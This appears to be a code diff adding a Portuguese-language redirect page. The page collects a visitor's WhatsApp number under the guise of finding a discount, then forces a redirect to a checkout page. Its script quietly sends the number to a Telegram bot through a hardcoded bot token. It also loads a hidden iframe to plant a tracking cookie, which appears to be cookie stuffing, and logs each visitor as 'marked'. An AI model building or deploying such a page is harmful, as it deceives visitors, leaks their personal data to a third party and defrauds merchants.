@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecionando</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .circle {
+      width: 30px;
+      height: 30px;
+      border: 4px solid green;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .text {
+      font-size: 24px;
+      transition: opacity 0.4s ease-in-out;
+    }
+
+    #fallback {
+      display: none;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+
+    #fallback a {
+      color: green;
+      text-decoration: underline;
+    }
+
+    #formulario {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    #whatsapp {
+      padding: 10px;
+      font-size: 18px;
+      width: 250px;
+    }
+
+    #okBtn {
+      padding: 10px 20px;
+      background-color: green;
+      color: white;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    #loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="formulario">
+    <input type="tel" id="whatsapp" placeholder="Informe seu WhatsApp" />
+    <button id="okBtn">OK</button>
+  </div>
+
+  <div id="loading">
+    <div class="circle"></div>
+    <div id="message" class="text">Espere! Procurando pelo Melhor Desconto</div>
+  </div>
+
+  <iframe id="cookieFrame" src="" style="display:none;"></iframe>
+
+  <div id="fallback">
+    Se não for redirecionado, <a href="https://google.com">clique aqui</a>.
+  </div>
+
+  <script>
+    const cookieURL = "https://google.com"; // URL para gravação do cookie
+    const checkoutURL = "https://google.com"; // URL de redirecionamento final
+    const NumeroTLG = '7674575961:AAGSl6HVhZJhymoedLgBMESc9rPF88Q98Es';
+    const CanalTLG = '5493027377';
+
+    const okBtn = document.getElementById("okBtn");
+    const whatsappInput = document.getElementById("whatsapp");
+    const formulario = document.getElementById("formulario");
+    const loading = document.getElementById("loading");
+    const msg = document.getElementById("message");
+    const iframe = document.getElementById("cookieFrame");
+    let cookieConfirmado = false;
+    let redirecionado = false;
+
+    function enviarAlerta(texto) {
+      fetch(`https://api.telegram.org/bot${NumeroTLG}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CanalTLG, text: texto })
+      }).catch(console.error);
+    }
+
+    // Inicia gravação do cookie imediatamente
+    iframe.src = cookieURL;
+
+    iframe.onload = () => {
+      setTimeout(() => {
+        try {
+          const _ = iframe.contentWindow.location.href;
+          cookieConfirmado = true;
+        } catch (e) {
+          cookieConfirmado = true;
+        }
+      }, 500);
+    };
+
+    okBtn.addEventListener("click", () => {
+      const numero = whatsappInput.value.trim();
+      if (!numero || numero.length < 8) {
+        alert("Por favor, insira um número de WhatsApp válido.");
+        return;
+      }
+
+      // Envia o número para o Telegram
+      enviarAlerta(`📲 WhatsApp Informado: ${numero}`);
+
+      // Oculta formulário e mostra carregamento
+      formulario.style.display = "none";
+      loading.style.display = "flex";
+
+      // Exibe mensagens de transição
+      setTimeout(() => {
+        msg.style.opacity = 0;
+        setTimeout(() => {
+          msg.textContent = "Redirecionando para Página de Pagamento";
+          msg.style.opacity = 1;
+        }, 400);
+      }, 3000);
+
+      // Redireciona após 4,5 segundos se o cookie tiver carregado
+      setTimeout(() => {
+        if (cookieConfirmado && !redirecionado) {
+          redirecionado = true;
+          enviarAlerta(`✅ USUÁRIO MARCADO E REDIRECIONADO\nPÁGINA: ${checkoutURL}`);
+          window.location.href = checkoutURL;
+        } else if (!cookieConfirmado && !redirecionado) {
+          redirecionado = true;
+          enviarAlerta(`⛔ ERRO AO MARCAR USUÁRIO, MAS REDIRECIONANDO\nPÁGINA: ${checkoutURL}`);
+          document.getElementById("fallback").style.display = "block";
+          window.location.href = checkoutURL;
+        }
+      }, 4500);
+    });
+
+    // Segurança extra: fallback se nada acontecer
+    setTimeout(() => {
+      if (!cookieConfirmado && !redirecionado) {
+        redirecionado = true;
+        enviarAlerta(`⛔ ERRO TOTAL NA MARCAÇÃO - REDIRECIONAMENTO FORÇADO`);
+        document.getElementById("fallback").style.display = "block";
+        window.location.href = checkoutURL;
+      }
+    }, 10000);
+  </script>
+
+</body>
+</html>
